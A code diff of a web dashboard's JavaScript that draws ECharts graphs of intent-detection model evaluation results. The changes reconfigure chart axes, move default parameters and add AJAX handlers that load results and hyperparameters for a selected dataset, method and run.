                         '#458B00','#00CED1','#BCEE68','#00FFFF','#FFF68F','#7FFFD4','#FFEC8B','#2E8B57','#FFFFE0','#98FB98',
-                        '#CDCD00','#00FA9A','#EEC900','	#9ACD32','#EEB422','#8FBC8F','#EEDD82','#EEB4B4','#8B6969','#CD5C5C',
+                        '#CDCD00','#00FA9A','#EEC900','#9ACD32','#EEB422','#8FBC8F','#EEDD82','#EEB4B4','#8B6969','#CD5C5C',
                         '#8B4513','#EE6363','#CD853F','#8B3A3A','#F4A460','#CD6839','#B22222','#FFE7BA','#6B8E23','#FFA54F',
                         '#FF7F50','#CD853F','#FF69B4','#8B4513','#FFB6C1','#CD2626','#FF00FF','#BA55D3','#EE9572','#D8BFD8',
                         '#36648B','#9B30FF','#009ACD','#AB82FF','#A4D3EE','#BFEFFF','#8B008B','#FF34B3','#FF8C00','#228B22'
                     ],
                     series: series
                 }
+                    //console.log('option_fine\t'+JSON.stringify(option_fine['series']))
                 return option_fine
             }
 
             function get_option_iokir(data_iokir){
                 var mylegend = [];
                 var series = [];
-                var xAxis_data = ['0.25','0.5', '0.75'];
+                var xAxis_data = ['1','2', '3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20'];
                 for(var key in data_iokir){
                     mylegend.push(key),
                     series.push({
-                        name: key, data: data_iokir[key], type: 'line' })
+                    name: key, data: data_iokir[key], type: 'line' })
                 }
                 var option_iokir = {
                     tooltip: { trigger: 'axis' },
-                    legend: { type:'scroll',data: mylegend, 
-                    padding:[20,0, 0,0],
-                },
+                    legend: { data: mylegend, 
+                    padding:[40,80, 0,0],
+                    },
                     grid: { left: '10%', right: '20%', bottom: '10%', top:'28%' },
                     xAxis: {
-                        name:'KIR',//横轴
+                        name:'KIR',
+                        padding:[0,0,0,0],//控制name位置
+                        type: 'category',
+                        boundaryGap: false,
+                        data: xAxis_data,
+                        nameTextStyle:{
+                            fontWeight:550,
+                        },
+                        axisLabel:{
+                            show: true,
+                            textStyle:{
+                            fontWeight: 550,
+                            fontSize:12
+                        }
+                    }
+
+                    },
+                    yAxis: { name:'Score', 
+                    nameTextStyle:{
+                            fontWeight:550,
+                        },
+                    padding:[0,0,0,0], 
+                    axisLabel:{
+                            show: true,
+                            textStyle:{
+                            fontWeight: 550,
+                            fontSize:12
+                        }
+                    },
+                    max:function(value){
+                    if(parseInt(value.max % 10) <5){
+                        
+                        return (parseInt(value.max / 10)*10)+10;  
+                    }else{
+                        return (parseInt(value.max / 10)*10)+20;
+                        }
+                    
+                }
+                },
+                    series: series
+                }
+                return option_iokir
+            }
+
+            function get_option_iolr(data_iolr){
+                var mylegend = [];
+                var series = [];
+                var xAxis_data = ['1','2', '3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20'];
+                for(var key in data_iolr){
+                    mylegend.push(key),
+                    series.push({ name: key, data: data_iolr[key], type: 'line'})
+                }
+                var option_fine = {
+                    tooltip: { trigger: 'axis' },
+                    legend: { data: mylegend, 
+                        padding:[40,80, 0,0],
+                    },
+                    grid: { left: '10%', right: '23%', bottom: '10%', top:'28%' },
+                    xAxis: {
+                        name:'LR',
                         padding:[0,0,0,0],//控制name位置
                         type: 'category',
                         boundaryGap: false,
@@ -499,7 +622,7 @@
                         }
                     }
                     },
-                    yAxis: { name:'Score', padding:[0,0,0,0], 
+                    yAxis: {name:'Score', padding:[0,0,0,0],
                     nameTextStyle:{
                             fontWeight:550,
                         },
@@ -509,8 +632,8 @@
                             fontWeight: 550,
                             fontSize:12
                         }
-                    },
-                    max:function(value){
+                    } ,
+                max:function(value){
                     // return value.max +10;
                     // return Math.ceil(value.max)+10;
                     if(parseInt(value.max % 10) <5){
@@ -519,64 +642,9 @@
                     }else{
                         return (parseInt(value.max / 10)*10)+20;
                         }
-                }
-                },
-                    series: series
-                }
-                return option_iokir
-            }
-
-            function get_option_iolr(data_iolr){
-                var mylegend = [];
-                var series = [];
-                var xAxis_data = [ '1', '2','3','4'];
-                for(var key in data_iolr){
-                    mylegend.push(key),
-                    series.push({ name: key, data: data_iolr[key], type: 'line'})
-                }
-                var option_fine = {
-                    tooltip: { trigger: 'axis' },
-                    legend: { type:'scroll', data: mylegend, 
-                    padding:[20,0, 0,0],
-                },
-                    grid: { left: '10%', right: '23%', bottom: '10%', top:'28%' },
-                    xAxis: {
-                        name:'NCF ',
-                        padding:[0,0,0,0],//控制name位置
-                        type: 'category',
-                        boundaryGap: false,
-                        data: xAxis_data, 
-                        nameTextStyle:{
-                            fontWeight:550,
-                        },
-                        axisLabel:{
-                            show: true,
-                            textStyle:{
-                            fontWeight: 550,
-                            fontSize:12
-                        }
-                    }
-                        
-                    },
-                    yAxis: {name:'Score', padding:[0,0,0,0], 
-                    nameTextStyle:{
-                            fontWeight:550,
-                        },
-                        axisLabel:{
-                            show: true,
-                            textStyle:{
-                            fontWeight: 550,
-                            fontSize:12
-                        }
-                    },
-                    max:function(value){
-                    if(parseInt(value.max % 10) <5){                        
-                        return (parseInt(value.max / 10)*10)+10;  
-                    }else{
-                        return (parseInt(value.max / 10)*10)+20;
-                        }
                     
                 }
+
                 },
                     series: series
                 }
@@ -584,88 +652,353 @@
             }
 
             function errorConfirm(errorMsg){
+                var baseErr = ': There is no data for this combination ！！！'
                 layer.confirm(
-                    errorMsg,
+                    errorMsg + baseErr,
                     { icon:6, btn:['Confirm'], title:'Attention Please' }
                 )
             }
 
             function init_show_1(){
-                // dataset_name_select_1 = $('#dataset_name_select_1').val()
-                // Known_Intent_Ratio_1 = $('#Known_Intent_Ratio_1').val()
-                // Annotated_Ratio_1 = $('#Annotated_Ratio_1').val()
-                // model_discovery_1 = $('#model_discovery_1').val()
-
-                //默认显示
+                
+                // dataset_name_select_1 = layui.jquery('#dataset_name_select_1').val()
+                // Known_Intent_Ratio_1 = layui.jquery('#Known_Intent_Ratio_1').val()
+                // Annotated_Ratio_1 = layui.jquery('#Annotated_Ratio_1').val()
+                // model_detection_1 = layui.jquery('#model_detection_1').val()
                 dataset_name_select_1 = 'banking'
                 Known_Intent_Ratio_1 = '0.75'
-                Annotated_Ratio_1 = '0.1'
-                model_discovery_1 = 'DeepAligned'
-
-
-                var key_ture_false = dataset_name_select_1 + '_'+ Known_Intent_Ratio_1 + '_' + Annotated_Ratio_1 + '_' + model_discovery_1
-                console.log('437:key_ture_false:\t'+key_ture_false)
-                //image1    Overall Performance
-                var myChart1 = echarts.init(document.getElementById('image1'));
-                //image2    Error Analyze
-                var myChart2 = echarts.init(document.getElementById('image2'));
-                var errorMsg = 'There is no data for this combination ！！！'
-                layui.jquery.get('/discovery/model_test/model_evaluation_getDataOfTFOverallByKey?key='+key_ture_false, function (data) {
+                Annotated_Ratio_1 = '1.0'
+                model_detection_1 = 'ADB'
+                var key_ture_false = dataset_name_select_1 + '_'+ Known_Intent_Ratio_1 + '_' + Annotated_Ratio_1 + '_' + model_detection_1
+                //image_3    Overall Performance
+                var myChart1 = echarts.init(document.getElementById('image_3'));
+                //image_4    Error Analyze
+                var myChart2 = echarts.init(document.getElementById('image_4'));
+                /*
+                layui.jquery.get('/detection/model_test/model_evaluation_getDataOfTFOverallByKey?key='+key_ture_false, function (data) {
+                var errorMsg = 'Overall Performance '
                     data_chart_1 = data.data;
                     if (data.code != 200){ errorConfirm(errorMsg); return false; }
                     myChart1.clear();
                     myChart1.setOption(get_option_ture_false_overall(data_chart_1));
                     },'json');
-                layui.jquery.get('/discovery/model_test/model_evaluation_getDataOfTFFineByKey?key='+key_ture_false, function (data) {
+                layui.jquery.get('/detection/model_test/model_evaluation_getDataOfTFFineByKey?key='+key_ture_false, function (data) {
+                var errorMsg = 'Error Analyze '
                     data_chart_2 = data.data;
                     if (data.code != 200){ errorConfirm(errorMsg); return false; }
                     myChart2.clear();//清除缓存
                     myChart2.setOption(get_option_ture_false_fine(data_chart_2));
-                    }, 'json');
+                    }, 'json');*/
             }
 
             function init_show_2(){
-                // dataset_name_select_2 = $('#dataset_name_select_2').val()
-                // // Label_Ratio_2 = $('#Label_Ratio_2').val()
-                // Evaluation_Metrics_2 = $('#Evaluation_Metrics_2').val()
-                dataset_name_select_2 = "banking"
-                Evaluation_Metrics_2 = "ACC"
-                // iok_data_str = "discovery_"+dataset_name_select_2+"_"+Label_Ratio_2+"_"+Evaluation_Metrics_2
-                iok_data_str = "discovery_"+dataset_name_select_2+"_1_"+Evaluation_Metrics_2
-                var myChart3 = echarts.init(document.getElementById('image3'));
-                var errorMsg = 'There is no data for this combination ！！！'
-                layui.jquery.get('/discovery/model_test/model_evaluation_getDataOfIOKIRByKey?key='+iok_data_str, function (data) {
+                // dataset_name_select_2 = layui.jquery('#dataset_name_select_2').val()
+                // Label_Ratio_2 = layui.jquery('#Label_Ratio_2').val()
+                // Evaluation_Metrics_2 = layui.jquery('#Evaluation_Metrics_2').val()
+                dataset_name_select_2 = 'banking'
+                Label_Ratio_2 = '0.8'
+                Evaluation_Metrics_2 = 'F1'
+                var key_ture_false = dataset_name_select_1 + '_'+ Known_Intent_Ratio_1 + '_' + Annotated_Ratio_1 + '_' + model_detection_1
+                iok_data_str = "discovery_"+dataset_name_select_2+"_"+Label_Ratio_2+"_"+Evaluation_Metrics_2
+                var myChart3 = echarts.init(document.getElementById('image_1'));
+                var errorMsg = 'Influence of Known Intent Ratio'
+                /*
+                // layui.jquery.get('/static/jsons/open_intent_detection/json_detection_IOKIR.json', function (data) {
+                layui.jquery.get('/detection/model_test/model_evaluation_getDataOfIOKIRByKey?key='+iok_data_str, function (data) {
+                    // console.log('500:'+iok_data_str)
+                    // console.log('502:'+JSON.stringify(data))
                     data_chart_3 = data.data
                     if (data.code != 200){ errorConfirm(errorMsg); return false; }
                     myChart3.clear();
                     myChart3.setOption(get_option_iokir(data_chart_3))
-                }, 'json');
+                }, 'json');*/
             }
             function init_show_3(){
-                // dataset_name_select_3 = $('#dataset_name_select_3').val()
-                // // Known_Intent_Ratio_3 = $('#Known_Intent_Ratio_3').val()
-                // Evaluation_Metrics_3 = $('#Evaluation_Metrics_3').val()
-                dataset_name_select_3 = "banking"
-                Evaluation_Metrics_3 = "ACC"
-                // iol_data_str = "discovery_"+dataset_name_select_3+"_"+Known_Intent_Ratio_3+"_"+Evaluation_Metrics_3
-                iol_data_str = "discovery_"+dataset_name_select_3+"_0.75_"+Evaluation_Metrics_3
-                var myChart4 = echarts.init(document.getElementById('image4'));
-                var errorMsg = 'There is no data for this combination ！！！'
-                layui.jquery.get('/discovery/model_test/model_evaluation_getDataOfIONOCByKey?key='+iol_data_str, function (data) {
-                // layui.jquery.get('/static/jsons/open_intent_discovery/json_discovery_IONOC.json', function (data) {
+                // dataset_name_select_3 = layui.jquery('#dataset_name_select_3').val()
+                // Known_Intent_Ratio_3 = layui.jquery('#Known_Intent_Ratio_3').val()
+                // Evaluation_Metrics_3 = layui.jquery('#Evaluation_Metrics_3').val()
+                dataset_name_select_3 = 'banking'
+                Known_Intent_Ratio_3 = '0.75'
+                Evaluation_Metrics_3 = 'F1'
+                iol_data_str = "discovery_"+dataset_name_select_3+"_"+Known_Intent_Ratio_3+"_"+Evaluation_Metrics_3
+                var myChart4 = echarts.init(document.getElementById('image_2'));
+                /*
+                var errorMsg = 'Influence of Label Ratio'
+                // layui.jquery.get('/static/jsons/open_intent_detection/json_detection_IOLR.json', function (data) {
+                layui.jquery.get('/detection/model_test/model_evaluation_getDataOfIOLRByKey?key='+iol_data_str, function (data) {
+                    // data_chart_4 = data[iol_data_str]
                     data_chart_4 = data.data
                     if (data.code != 200){ errorConfirm(errorMsg); return false; }
                     myChart4.clear();
                     myChart4.setOption(get_option_iolr(data_chart_4))
-                }, 'json');
+                }, 'json');*/
             }
 
 
+
+            function init_image_all(){
+               
+                    
+                    
+                    dataset_name_select_2 = $('#dataset_name_select_2').val()
+                    model_detection_1 = $('#model_detection_1').val()   //method----------------------------
+                    log_id = $('#create_time').val()
+                    console.log("log_id_264:",log_id)
+                    // console.log(dataset_name_select_2,model_detection_1,create_time)
+                    if(dataset_name_select_2 == 'Dataset'){
+                        layer.msg('Please select Dataset');
+                    } else if(Label_Ratio_2 == 0){
+                        layer.msg('Please select Label Ratio');
+                    } else if(Evaluation_Metrics_2 == 0){
+                        layer.msg('Please select Evaluation Metrics');
+                    }else{
+                        if(Label_Ratio_2 == 1 || Label_Ratio_2 == "1"){
+                            Label_Ratio_2 = "1.0"
+                        }else if(model_detection_1 == 'model_detection_1'){
+                        layer.msg('Please select New Intent Detection');
+                    }   
+                        iok_data_str = "discovery_"+dataset_name_select_2+"_"+model_detection_1+"_"+log_id
+                        // iok_data_str = "detection_"+dataset_name_select_2+"_"+Label_Ratio_2+"_"+Evaluation_Metrics_2
+                        var myChart3 = echarts.init(document.getElementById('image_1'));
+                        // var errorMsg = 'Influence of Known Intent Ratio'
+
+                        //第一张图
+                        $.get('/discovery/model_test/model_evaluation_getDataOfIOKIRByKey_new?key='+iok_data_str, function (data) {
+                        data_chart_3 = data.data
+                        // if (data.code != 200){ errorConfirm(errorMsg); return false; 
+                        myChart3.clear();
+                        myChart3.setOption(get_option_iokir(data_chart_3))
+                    }, 'json');
+
+                        
+
+                        //第二张图
+                        
+                        iol_data_str = "discovery_"+dataset_name_select_2+"_"+model_detection_1+"_"+log_id
+                        var myChart4 = echarts.init(document.getElementById('image_2'));
+                        var errorMsg = 'Influence of Label Ratio'
+                        $.get('/discovery/model_test/model_evaluation_getDataOfIOLRByKey_new?key='+iol_data_str, function (data) {
+                            // data_chart_4 = data[iol_data_str]
+                            data_chart_4 = data.data
+                        if (data.code != 200){ errorConfirm(errorMsg); return false; }
+                            myChart4.clear();
+                            myChart4.setOption(get_option_iolr(data_chart_4))
+                        }, 'json');
+
+                        //第三张图
+                        tfo_data_str = dataset_name_select_2+"_"+model_detection_1+"_"+log_id
+                        var myChart1 = echarts.init(document.getElementById('image_3'));
+                        $.get('/discovery/model_test/model_evaluation_getDataOfTFOverallByKey_new?key='+tfo_data_str, function (data) {
+                        data_chart_1 = data.data
+                        // if (data.code != 200){ errorConfirm(errorMsg); return false; 
+                        myChart1.clear();
+                        myChart1.setOption(get_option_ture_false_overall(data_chart_1))
+                        }, 'json');
+
+                        //第四张图
+                        ea_data_str = dataset_name_select_2+"_"+model_detection_1+"_"+log_id
+                        var myChart2 = echarts.init(document.getElementById('image_4'));
+                        $.get('/discovery/model_test/model_evaluation_getDataOfTFFineByKey_new?key='+ea_data_str, function (data) {
+                        data_chart_2 = data.data
+                        // if (data.code != 200){ errorConfirm(errorMsg); return false; 
+                        myChart2.clear();
+                        myChart2.setOption(get_option_ture_false_fine(data_chart_2))
+                        }, 'json');
+                                        
+                        $ = layui.jquery;
+      
+                        $.get('/detection/model_test/show_hyper_parameters?log_id='+log_id, function (data) {                            
+                           if (data.code != 200){ 
+
+                            }
+                                   //console.log( JSON.parse(data.data[0]))
+                                   console.log(data)
+                                //    console.log(data.data.length)
+                                //    $("#create_time").empty();
+                                   
+                                // for(var i = 0; i<data.data.length;i++){
+                                //     $("#create_time").append("<option value="+data.data[i].log_id+">"+data.data[i].create_time+"</option>");
+                                // }
+                                    // $("#select_data").append("<option value="+kkk+">"+KKKK+"</option>");
+                                    form.render('select');
+                                    console.log("_____________________750_____________________")
+                                    $("#textarea_parm").empty();
+                               
+                                  
+
+                               
+                                for(var i = 0; i<data.data.length;i++){
+                                    $("#textarea_parm").append('<tr>');
+                                        
+                                        $("#textarea_parm").append("<td>"+data.data[i].param_name+"</td>");
+                                        $("#textarea_parm").append("<td>"+data.data[i].default_value+"</td>");
+                                        
+                                    $("#textarea_parm").append('</tr>');
+
+     
+                                }
+                               
+                                   //console.log( JSON.parse(data))
+                                   //JSON.parse(data.data[0])
+                                  //window.location.href="../model_test/?data="+data.data[0]//.dataset_name
+                                   },'json');
+                    }
+                   
+                
+               
+
+
+
+            }
+           
+            
+            
+            </script>
+            <script>
+    layui.use(['form'], function() {
+        var val1,val2
+        val1 = $('#dataset_name_select_2').val()
+        val2 = $('#model_detection_1').val()  
+    form=layui.form;
+    form.on('select(dataset)', function(data){
+        $ = layui.jquery;
+     val1=data.value;
+     console.info(val1,val2);
+     if(val1=='Dataset'){
+       
+         layer.msg('Please select Dataset');
+         
+     }else 
+     if(val1!=undefined & val2!=undefined){
+        show_create_time(val1,val2)
+     }
+    
+    });
+
+    form.on('select(method)', function(data){
+        val1 = $('#dataset_name_select_2').val()
+        val2 = $('#model_detection_1').val()  
+        val2=data.value;
+        console.info(val1,val2);
+        if(val2=='model_detection_1'){
+     
+         layer.msg('Please select method');
+     }else
+        if(val1!=undefined & val2!=undefined){
+        show_create_time(val1,val2)
+     }
+    });
+    form.on('select(Evaluation)', function(data){
+        $ = layui.jquery;
+        console.log(data.value)
+        //选择Evaluation，画图
+        //第二张图
+        log_id= $('#create_time').val()
+        console.log("log_id",log_id)
+       
+        var evaluation=data.value
+        iol_data_str = "discovery_"+dataset_name_select_2+"_"+model_detection_1+"_"+log_id+"_"+evaluation
+        var myChart4 = echarts.init(document.getElementById('image_2'));
+        var errorMsg = 'Influence of Label Ratio'
+        $.get('/discovery/model_test/model_evaluation_getDataOfIOLRByKey_new?key='+iol_data_str, function (data) {
+            // data_chart_4 = data[iol_data_str]
+            data_chart_4 = data.data
+        if (data.code != 200){ errorConfirm(errorMsg); return false; }
+            myChart4.clear();
+            myChart4.setOption(get_option_iolr(data_chart_4))
+        }, 'json');
+
+
+    });
+    function show_create_time(dataset_name,model_name){
+        $ = layui.jquery;
+      
+        $.get('/detection/model_test/show_create_time?dataset_name='+dataset_name+"&model_name="+model_name, function (data) {
+                           
+                            
+                           if (data.code != 200){  }
+                                   //console.log( JSON.parse(data.data[0]))
+                                   console.log(data.data)
+                                   console.log(data.data.length)
+                                   $("#create_time").empty();
+                                for(var i = 0; i<data.data.length;i++){
+                                    $("#create_time").append("<option value="+data.data[i].log_id+">"+data.data[i].create_time.replace(/-/g,'/').replace(/T/g,'  ')+"</option>");
+                                }
+                                   
+                                  
+                                    // $("#select_data").append("<option value="+kkk+">"+KKKK+"</option>");
+                                    form.render('select');
+                                    console.log("_____________________750_____________________")
+                                   //console.log( JSON.parse(data))
+                                   //JSON.parse(data.data[0])
+                                  //window.location.href="../model_test/?data="+data.data[0]//.dataset_name
+                                   },'json');
+
+
+
+    }
+
+    
+});
             </script>
         <script>
+        
+        // console.log('运行了竟然');
+
         init_show_1();
         init_show_2();
         init_show_3();
+
+        
+        init_image_all()
+        setTimeout("style_op()","100"); 
+        
+         function style_op(){
+                console.log("width:",$("#select_").width())
+
+                $("#title_btn1").width($("#select_").width()+1); 
+                $("#title_btn2").width($("#select_").width()); 
+                $("#title_btn3").width($("#select_").width()); 
+            }
+        
+        /**
+ * [获取URL中的参数名及参数值的集合]
+ * 示例URL:http://htmlJsTest/getrequest.html?uid=admin&rid=1&fid=2&name=小明
+ * @param {[string]} urlStr [当该参数不为空的时候，则解析该url中的参数集合]
+ * @return {[string]}       [参数集合]
+ */
+
+ function test_change(){
+                console.log("change!!")
+                var obj = document.getElementById('dataset_name_select_2');
+                //dataset_name_select_1 = $('#dataset_name_select_2').val()
+                console.log(obj)
+              
+
+            }
+
+function GetRequest(urlStr) {
+    if (typeof urlStr == "undefined") {
+        var url = decodeURI(location.search); //获取url中"?"符后的字符串
+    } else {
+        var url = "?" + urlStr.split("?")[1];
+    }
+    var theRequest = new Object();
+    if (url.indexOf("?") != -1) {
+        var str = url.substr(1);
+        strs = str.split("&");
+        for (var i = 0; i < strs.length; i++) {
+            theRequest[strs[i].split("=")[0]] = decodeURI(strs[i].split("=")[1]);
+        }
+    }
+    return theRequest;
+}
+var parms_1 = GetRequest();
+
+for(var key in parms_1){
+    console.log(key)
+}
+
         </script>
     </body>
 
